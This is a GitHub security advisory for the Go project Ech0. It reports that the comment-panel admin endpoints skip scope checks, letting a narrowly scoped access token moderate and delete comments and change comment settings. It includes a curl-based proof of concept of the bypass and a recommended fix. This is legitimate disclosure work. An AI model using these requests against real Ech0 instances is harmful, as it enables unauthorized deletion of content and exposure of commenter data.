# [M] Ech0 Comment Panel Endpoints Missing RequireScopes Middleware — Scoped Access Token Bypass

## Summary
Severity: Medium
Advisory: GHSA-fwg7-53p4-g33c
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-fwg7-53p4-g33c
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.4.3

## Details
## Summary

All 9 comment panel admin endpoints (`/api/panel/comments/*`) are missing `RequireScopes()` middleware, while every other admin endpoint in the application enforces scope-based authorization on access tokens. An admin-issued access token scoped to minimal permissions (e.g., `echo:read` only) can perform full comment moderation operations including listing, approving, rejecting, deleting comments, and modifying comment system settings.

## Details

The access token scope enforcement system works as follows: `JWTAuthMiddleware` (`internal/middleware/auth.go`) parses any valid JWT and injects a viewer into the request context. The `RequireScopes()` middleware (`internal/middleware/scope.go:14`) then checks whether the token is an access token and, if so, validates that it carries the required scopes. Session tokens are passed through without scope checks (by design — sessions represent full user authority).

Every admin route group applies `RequireScopes()` per-handler:

- `internal/router/echo.go` — uses `RequireScopes(ScopeEchoWrite)` / `RequireScopes(ScopeEchoRead)`
- `internal/router/file.go` — uses `RequireScopes(ScopeFileRead)` / `RequireScopes(ScopeFileWrite)`
- `internal/router/user.go` — uses `RequireScopes(ScopeAdminUser)` / `RequireScopes(ScopeProfileRead)`
- `internal/router/setting.go` — uses `RequireScopes(ScopeAdminSettings)` / `RequireScopes(ScopeAdminToken)`

However, `internal/router/comment.go:28-36` registers all 9 panel endpoints directly on `AuthRouterGroup` without any `RequireScopes()` call:

```go
// internal/router/comment.go:28-36
appRouterGroup.AuthRouterGroup.GET("/panel/comments", h.CommentHandler.ListPanelComments())
appRouterGroup.AuthRouterGroup.GET("/panel/comments/:id", h.CommentHandler.GetCommentByID())
appRouterGroup.AuthRouterGroup.PATCH("/panel/comments/:id/status", h.CommentHandler.UpdateCommentStatus())
appRouterGroup.AuthRouterGroup.PATCH("/panel/comments/:id/hot", h.CommentHandler.UpdateCommentHot())
appRouterGroup.AuthRouterGroup.DELETE("/panel/comments/:id", h.CommentHandler.DeleteComment())
appRouterGroup.AuthRouterGroup.POST("/panel/comments/batch", h.CommentHandler.BatchAction())
appRouterGroup.AuthRouterGroup.GET("/panel/comments/settings", h.CommentHandler.GetCommentSetting())
appRouterGroup.AuthRouterGroup.PUT("/panel/comments/settings", h.CommentHandler.UpdateCommentSetting())
appRouterGroup.AuthRouterGroup.POST("/panel/comments/settings/test-email", h.CommentHandler.TestCommentEmail())
```

The service layer's `requireAdmin()` (`internal/service/comment/comment.go:719-732`) only validates the user's database role (`IsAdmin`/`IsOwner`), not the token's scopes:

```go
func (s *CommentService) requireAdmin(ctx context.Context) error {
    v := viewer.MustFromContext(ctx)
    if v == nil || strings.TrimSpace(v.UserID()) == "" {
        return commonModel.NewBizError(...)
    }
    user, err := s.commonService.CommonGetUserByUserId(ctx, v.UserID())
    if err != nil { return err }
    if !user.IsAdmin && !user.IsOwner {
        return commonModel.NewBizError(...)
    }
    return nil
}
```

The scopes `comment:read`, `comment:write`, and `comment:moderate` are defined in `internal/model/auth/scope.go:11-13` and registered as valid scopes, but are never referenced in any `RequireScopes()` middleware call anywhere in the codebase.

**Execution flow:** Request with access token (scoped to `echo:read` only) → `JWTAuthMiddleware` extracts user ID, sets viewer → No `RequireScopes` middleware → Handler calls service → `requireAdmin()` checks `user.IsAdmin` (true for admin user) → Operation succeeds.

## PoC

```bash
# 1. As admin, create an access token scoped ONLY to echo:read
curl -X POST https://target/api/settings/access-tokens \
  -H 'Authorization: Bearer <admin-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"readonly","scopes":["echo:read"],"audience":["public-client"],"expiry_days":30}'
# Save the returned token as $TOKEN

# 2. Verify the token CANNOT access other admin endpoints (scoped correctly):
curl https://target/api/settings \
  -H "Authorization: Bearer $TOKEN"
# Expected: 403 Forbidden (scope check blocks access)

# 3. Use the same limited token to list ALL comments (including pending/rejected):
curl https://target/api/panel/comments \
  -H "Authorization: Bearer $TOKEN"
# Expected: 200 OK with full comment list (bypasses scope enforcement)

# 4. Delete a comment:
curl -X DELETE https://target/api/panel/comments/<comment-id> \
  -H "Authorization: Bearer $TOKEN"
# Expected: 200 OK (should require comment:moderate scope)

# 5. Approve/reject comments:
curl -X PATCH https://target/api/panel/comments/<comment-id>/status \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"status":"approved"}'
# Expected: 200 OK (should require comment:moderate scope)

# 6. Read comment system settings:
curl https://target/api/panel/comments/settings \
  -H "Authorization: Bearer $TOKEN"
# Expected: 200 OK (may expose SMTP configuration)

# 7. Disable the comment system entirely:
curl -X PUT https://target/api/panel/comments/settings \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"enable_comment":false}'
# Expected: 200 OK (should require admin:settings scope)
```

## Impact

- **Principle of least privilege violation**: Access tokens designed to limit admin capabilities do not restrict comment panel access. An integration token intended only for reading echoes gains full comment moderation authority.
- **Unauthorized comment moderation**: An attacker who compromises a limited-scope access token (e.g., a CI/CD token scoped to `echo:read`) can approve, reject, delete, and batch-modify all comments.
- **Data exposure**: The panel comment listing endpoint returns commenter PII (email addresses, IP hashes, user agents) that should be restricted to tokens with `comment:read` scope.
- **Settings modification**: Comment system settings (including potentially SMTP configuration) can be read and modified, and test emails can be triggered, which could leak mail server credentials.
- **Scope**: The attack requires an admin-issued access token, which limits the attack surface (PR:H). However, access tokens are specifically designed for limited-privilege integrations, and this vulnerability negates those limits for the entire comment subsystem.

## Recommended Fix

Add `RequireScopes()` middleware to all comment panel routes in `internal/router/comment.go`:

```go
func setupCommentRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	// ... captcha and public routes unchanged ...

	// Admin Panel — enforce scopes on access tokens
	appRouterGroup.AuthRouterGroup.GET("/panel/comments",
		middleware.RequireScopes(authModel.ScopeCommentRead),
		h.CommentHandler.ListPanelComments())
	appRouterGroup.AuthRouterGroup.GET("/panel/comments/:id",
		middleware.RequireScopes(authModel.ScopeCommentRead),
		h.CommentHandler.GetCommentByID())
	appRouterGroup.AuthRouterGroup.PATCH("/panel/comments/:id/status",
		middleware.RequireScopes(authModel.ScopeCommentMod),
		h.CommentHandler.UpdateCommentStatus())
	appRouterGroup.AuthRouterGroup.PATCH("/panel/comments/:id/hot",
		middleware.RequireScopes(authModel.ScopeCommentMod),
		h.CommentHandler.UpdateCommentHot())
	appRouterGroup.AuthRouterGroup.DELETE("/panel/comments/:id",
		middleware.RequireScopes(authModel.ScopeCommentMod),
		h.CommentHandler.DeleteComment())
	appRouterGroup.AuthRouterGroup.POST("/panel/comments/batch",
		middleware.RequireScopes(authModel.ScopeCommentMod),
		h.CommentHandler.BatchAction())
	appRouterGroup.AuthRouterGroup.GET("/panel/comments/settings",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.CommentHandler.GetCommentSetting())
	appRouterGroup.AuthRouterGroup.PUT("/panel/comments/settings",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.CommentHandler.UpdateCommentSetting())
	appRouterGroup.AuthRouterGroup.POST("/panel/comments/settings/test-email",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.CommentHandler.TestCommentEmail())
}
```

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-fwg7-53p4-g33c
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.4.3
